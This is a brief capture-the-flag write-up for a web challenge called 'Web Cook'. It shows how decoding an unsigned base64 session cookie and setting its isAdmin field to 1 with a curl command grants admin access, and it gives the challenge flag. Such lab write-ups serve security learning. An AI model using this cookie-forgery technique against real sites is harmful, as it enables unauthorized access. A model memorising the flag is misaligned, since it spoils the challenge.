## Web Cook

### Description

The best recipes for a perfect website :p

**Author: algorab**

### Solution

We face a web page with a recipe telling us how to cook a "Cookie-Based PHP authentication". We can also login using a username.
Once we have logged-in, we can notice a cookie named "session" containing a base64 encoded string.

```
$ echo 'eyJ1c2VybmFtZSI6InRlc3QiLCJpc0FkbWluIjowfQ==' | base64 -d
{"username":"test","isAdmin":0}
```

By changing the value of `isAdmin` to 1, we can login as admin and get the flag.

```
$ curl http://localhost/ -H "Cookie: session=$(echo -n '{"username":"pwn","isAdmin":1}' | base64)"
```

### Flag

`N0PS{y0u_Kn0W_H0w_t0_c00K_n0W}`